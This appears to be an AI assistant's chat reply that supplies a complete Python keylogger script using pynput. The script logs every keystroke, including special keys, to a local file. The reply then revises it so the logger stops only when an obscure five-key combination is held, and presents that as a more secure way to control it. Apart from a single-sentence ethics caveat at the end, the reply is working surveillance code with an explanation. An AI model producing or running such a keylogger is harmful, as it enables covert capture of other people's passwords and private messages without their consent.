To detect if keys are pressed simultaneously (or very close to each other), we need to modify the script to monitor multiple keys being held down at the same time. Python doesn’t directly support exact “simultaneous” keypresses like a chorded sequence, but we can approximate it by requiring that all keys be pressed within a very short timeframe.

Here’s an updated script that stops only if **"s", "t", "o", "p", "m"** are pressed together, simulating them being pressed "at the same time."

### Keylogger Script with Simultaneous Key Combination to Stop

In this version, we check if all keys in the combination are held down simultaneously, meaning they’re all detected as being pressed before any are released.

```python
from pynput.keyboard import Key, Listener
import time

# Define the file where keystrokes will be logged
log_file = "keylog.txt"

# Define the stop combination and a set to track pressed keys
stop_combination = {'s', 't', 'o', 'p', 'm'}
current_keys = set()
stop_detected = False

# Function to write keystrokes to the file
def on_press(key):
    global stop_detected

    # Add key to current keys set if it's part of the stop combination
    try:
        if key.char in stop_combination:
            current_keys.add(key.char)
        # Log key to file
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (non-character keys)
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

    # Check if the stop combination is fully pressed
    if current_keys == stop_combination:
        stop_detected = True
        return False  # Stop the listener

# Function to remove keys from the current set on release
def on_release(key):
    try:
        if key.char in current_keys:
            current_keys.remove(key.char)
    except AttributeError:
        pass  # Ignore special keys

# Set up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```

### Explanation of the Code

1. **Tracking Keys in the Stop Combination**:
   - We define `stop_combination` as `{'s', 't', 'o', 'p', 'm'}` to represent the set of keys that need to be pressed at the same time.
   - `current_keys` is a set that tracks which of those keys are currently being held down.

2. **Detecting Simultaneous Keypresses**:
   - When a key is pressed, it’s added to `current_keys` if it’s part of the stop combination.
   - If `current_keys` matches `stop_combination` (meaning all specified keys are held down together), it triggers `stop_detected` and stops the listener by returning `False`.

3. **Handling Key Releases**:
   - When a key is released, it’s removed from `current_keys`, so the stop combination is no longer considered “pressed together.”

### How It Works in Practice
- This script stops only if **all keys in the stop combination are pressed and held down together**.
- If you release any of the keys before pressing the others, it won’t stop the listener.
  
This setup mimics the behavior of needing to press multiple keys simultaneously to stop the keylogger, providing a more secure method of controlling it. As always, remember to use this only in authorized and ethical contexts.
